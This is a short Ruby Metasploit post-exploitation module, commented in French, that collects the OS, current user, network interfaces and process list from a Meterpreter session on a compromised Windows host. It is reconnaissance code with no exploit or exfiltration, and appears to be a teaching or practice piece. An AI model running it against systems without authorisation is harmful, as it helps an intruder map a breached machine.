#!/usr/bin/env ruby   # Shebang : indique que ce fichier est interprété par Ruby

require 'msf/core'    # Charge le cœur du framework Metasploit

# Définition du module
class MetasploitModule < Msf::Post
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Information Gathering Module',   # Nom affiché dans msfconsole
      'Description'    => %q{
        Gathers system, user, network, and process information from a Windows target once access is gained.
      },
      'Author'         => ['benbet21cyber'],
      'License'        => MSF_LICENSE
    ))

    # Déclaration des options configurables
    register_options(
      [
        OptInt.new('SESSION', [true, 'The session to run this module on']) # ID de la session Meterpreter
      ]
    )
  end

  # Méthode principale exécutée avec "run"
  def run
    session_id = datastore['SESSION']
    print_status("Gathering system information from session #{session_id}")

    gathersysteminfo
    gatheruserinfo
    gathernetworkinfo
    gatherrunningprocesses

    print_status('Post-exploitation module execution completed')
  end

  # Récupère les infos système
  def gathersysteminfo
    sysinfo = session.sys.config.sysinfo
    print_status("OS: #{sysinfo['OS']}")
    print_status("Computer: #{sysinfo['Computer']}")
  end

  # Récupère l’utilisateur courant
  def gatheruserinfo
    user = session.sys.config.getuid
    print_status("User: #{user}")
  end

  # Récupère les infos réseau
  def gathernetworkinfo
    interfaces = session.net.config.interfaces
    interfaces.each do |iface|
      print_status("Interface: #{iface[:name]}, IP: #{iface[:ip]}, Netmask: #{iface[:netmask]}, Broadcast: #{iface[:broadcast]}")
    end
  end

  # Récupère les processus en cours
  def gatherrunningprocesses
    processes = session.sys.process.get_processes
    processes.each do |proc|
      print_status("Process #{proc['pid']} - #{proc['name']}")
    end
  end
end
